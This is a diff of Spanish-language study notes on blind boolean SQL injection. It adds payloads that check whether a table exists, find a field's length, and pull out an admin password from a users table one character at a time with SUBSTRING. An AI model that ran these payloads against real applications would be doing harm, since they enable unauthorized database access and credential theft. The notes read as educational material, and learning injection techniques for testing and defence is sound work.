@@ -92,16 +92,35 @@ ex: 'string' 'string'
 
 Validar la existencia de una tabla por medio de una consulta booleana, limitando el resultado para no romper la consulta.
 
-' and select '[value]' from [table_name] LIMIT 1)='[value]'--
+' AND SELECT '[value]' FROM [table_name] LIMIT 1)='[value]'--
 
 Una vez con el nombre de la tabla, se puede consultar fields especificos cambiando el query y agregando la funcion WHERE:
 
-' and select [field] from [table_name] where [field]='[value]')='[value]'--
+' AND SELECT [field] FROM [table_name] WHERE [field]='[value]')='[value]'--
+
+_ENUMERAR EL TAMANO DE UN CAMPO ?
+
+' AND SELECT [field_name] FROM [table_name] WHERE [field_name]='[value]' AND LENGTH(field_name)>1)='value'--
+' AND SELECT username FROM users WHERE username='admin' AND LENGTH(password)>1)='admin'--
+
+NOTA: es necesario iterar el numero de posicion hasta no tener expected responses, de esa manera se obtiene la cantidad de caracteres.
+
+_COMO ENUMERAR EL CONTENIDO "STRING" DE UN CAMPO ?
 
 --> funcion substring
 
-Oracle:	SUBSTR('string', 4, 2) \
-Microsoft:	SUBSTRING('string', 4, 2) \
-PostgreSQL:	SUBSTRING('string', 4, 2) \
-MySQL:	SUBSTRING('string', 4, 2)
+el primer numero, por ejemplo, "4", es la posicion a iterar. el segundo numero es a una posicion.
+
+Oracle:	SUBSTR('string', 4, 1) \
+Microsoft:	SUBSTRING('string', 4, 1) \
+PostgreSQL:	SUBSTRING('string', 4, 1) \
+MySQL:	SUBSTRING('string', 4, 1)
+
+' AND SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
+
+    NOTA: Por ejemplo para iterar una posible contrasena se debe cambiar la posicion y el valor final a igual, en este caso el numero "1" y la
+    letra "a".
+
+
+
 
